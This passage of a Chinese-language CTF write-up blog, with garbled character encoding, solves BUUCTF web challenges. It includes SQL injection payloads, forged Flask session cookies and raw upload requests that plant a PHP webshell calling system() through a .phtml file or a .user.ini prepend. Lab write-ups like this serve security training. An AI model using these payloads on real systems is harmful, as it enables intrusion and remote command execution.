class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//includeÂ &#x27;class.php&#x27;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">Name</span></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$usernameÂ </span>=Â <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$passwordÂ </span>=Â <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aaÂ </span>=Â <span class="keyword">new</span>Â Name(<span class="string">&quot;admin&quot;</span>,Â <span class="number">100</span>);</span><br><span class="line">print_r(serialize(<span class="variable">$aa</span>));</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">26611</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Syclover/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Referer: https://www.Sycsecret.com</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦ä¸‰ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªRefererï¼Œä¸€ä¸ªXFFï¼Œä¸€ä¸ªæ”¹æµè§ˆå™¨æ ‡è¯†</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>åšæ³•1ï¼šSessionä¼ªé€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span> æ‹¿åˆ°secret_key</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨githubä¸Šä¸€ä¸ªå¼€æºé¡¹ç›®ä¼ªé€ session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s ckj123 -c <span class="string">&quot;.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UGEYqoG6nqv2_ZoKA_X6BbWIa8E.X4VwIA.Rkin6-MMArxsGd_I2z5Ub0AaWjg&quot;</span></span><br><span class="line">-sè·Ÿsecret_key -cè·Ÿsession</span><br><span class="line">è§£å¾—&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;_id&#x27;</span>: <span class="string">b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: <span class="string">b&#x27;p6D8&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br><span class="line">ä¿®æ”¹å¯¹åº”å€¼ä¸ºadmin</span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s ckj123 -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;, &#x27;csrf_token&#x27;: b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;, &#x27;image&#x27;: b&#x27;p6D8&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line">åŠ å¯†å¾—åˆ°.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UNtSmpMaqOu5at-_qTBQr1-f7W03.X4VxOQ.KRA69X0skFKOV_aVoNryiWVok1w</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>è¿‡æ»¤äº†union select or fromè¿™äº›ï¼Œå¤å†™ç»•è¿‡å°±å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(schema_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.schemata%<span class="number">20</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(table_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.tables%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(column_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.columns%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">20</span>anandd%<span class="number">20</span>table_name%<span class="number">3</span>D%<span class="number">27</span>b4bsql%<span class="number">27</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(passwoorrd)%<span class="number">20</span>frfromom%<span class="number">20</span>b4bsql%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>åç¼€åç»•è¿‡php,php3,php4,php5,phtml,pht</p><p>æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: c887928f-<span class="number">75</span>ce-<span class="number">45</span>ce-<span class="number">9</span>fad-<span class="number">32</span>dd56874aa9.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">342</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUpGgttuPSdHTxZgd</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;pnghead.phtml&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Â‰PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd--</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>æºç index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å–key=123</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>ä¸Šä¼ phtmlç»•è¿‡phpåç¼€æ£€æŸ¥</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æ­£åˆ™r&#39;/ph|htaccess/i&#39;ï¼Œæ²¡åŠæ³•ç»•è¿‡ï¼Œè¿™é‡Œç”¨ä¸Šä¼ .user.iniæ¥å¤„ç†ï¼Œåˆ†åˆ«ä¸Šä¼ </p><p>.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">318</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Â‰PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">auto_prepend_file=2.jpg</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><p>2.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">340</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;2.jpg&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Â‰PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pay.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">63</span>c15e7b-<span class="number">97</span>d2-<span class="number">4281</span>-<span class="number">830e-0</span>e314c5a4573.node3.buuoj.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: user=1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">password=404a&amp;money=1e9</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>çŸ¥è¯†ç‚¹1</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/md5.png"></p><p>æŒ‡å®štrueçš„æ—¶å€™å¯ä»¥ç”¨åˆ°æ‹¼æ¥ï¼Œffifdyopçš„md5($str1, true)åè¿”å›å½¢å¦‚&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1cï¼Œæ‹¼æ¥åå°±</p><p>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</p><p>çŸ¥è¯†ç‚¹2</p><p>phpåŒç­‰å·å¼±ç±»å‹QNKCDZOï¼Œs155964671aï¼Œs1091221200a</p><p>çŸ¥è¯†ç‚¹3</p><p>md5å‡½æ•°å¦‚æœä¼ é€’ç»™å®ƒçš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¼šè¿”å›FALSE</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p><p>è¯´çš„æ˜¯php://inputä¹Ÿå¯ä»¥ä½†æ˜¯å®é™…ä¸Šä¸è¡Œ è¯»å‡ºæ¥ä¼šåŒ…å«å˜é‡å</p><p>åˆ©ç”¨file=php://filter/convert.base64-encode/resource=useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•çš„ååºåˆ—åŒ–ï¼Œç»™$fileèµ‹å€¼å°±è¡Œ</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 